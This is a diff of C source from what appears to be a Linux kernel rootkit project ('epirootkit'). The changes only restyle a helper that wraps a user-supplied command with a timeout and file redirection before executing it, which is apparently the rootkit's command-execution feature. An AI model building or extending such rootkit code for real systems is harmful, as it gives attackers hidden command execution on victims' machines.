@@ -1,6 +1,6 @@
+#include <linux/kmod.h>
 #include <linux/slab.h>
 #include <linux/string.h>
-#include <linux/kmod.h>
 #include <linux/types.h>
 
 #include "epirootkit.h"
@@ -43,13 +43,16 @@ static int build_full_command(char *buffer, size_t buffer_size,
     if ((redirect_stderr && redirect_stdout) || !catch_stds) {
         format = "%s %s";
         return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd) >= buffer_size ? -EINVAL : 0;
-    } else if (redirect_stderr) {
+    }
+    else if (redirect_stderr) {
         format = "%s %s > %s";
         return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stdout_file) >= buffer_size ? -EINVAL : 0;
-    } else if (redirect_stdout) {
+    }
+    else if (redirect_stdout) {
         format = "%s %s 2> %s";
         return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stderr_file) >= buffer_size ? -EINVAL : 0;
-    } else {
+    }
+    else {
         format = "%s %s > %s 2> %s";
         return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stdout_file, stderr_file) >= buffer_size ? -EINVAL : 0;
     }
@@ -94,9 +97,9 @@ int exec_str_as_command_with_timeout(char *user_cmd, bool catch_stds, int timeou
     }
 
     status = build_full_command(cmd_buffer, STD_BUFFER_SIZE,
-                                 timeout_cmd, user_cmd,
-                                 redir_stdout, redir_stderr,
-                                 catch_stds, STDOUT_FILE, STDERR_FILE);
+                                timeout_cmd, user_cmd,
+                                redir_stdout, redir_stderr,
+                                catch_stds, STDOUT_FILE, STDERR_FILE);
 
     if (status < 0) {
         DBG_MSG("Command too long or invalid\n");
